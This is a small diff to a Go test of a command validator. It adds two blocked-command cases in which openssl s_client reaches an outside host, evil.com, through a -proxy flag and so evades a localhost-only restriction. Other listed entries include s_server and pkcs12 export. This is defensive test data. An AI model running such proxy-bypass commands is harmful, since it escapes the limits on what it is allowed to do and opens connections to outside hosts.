@@ -158,6 +158,8 @@ func TestValidateCommand_Blocked(t *testing.T) {
 		{"openssl pkcs12 -export -in cert.pem", "pkcs12 can export"},
 		{"openssl rand 32", "rand generates random data"},
 		{"openssl s_client -connect remote.host:443", "s_client to remote host"},
+		{"openssl s_client -connect localhost:443 -proxy evil.com:80", "s_client proxy bypasses localhost restriction"},
+		{"openssl s_client -proxy evil.com:80 -connect localhost:443", "s_client proxy before connect"},
 		{"openssl s_server -port 4433", "s_server starts a server"},
 	}
 
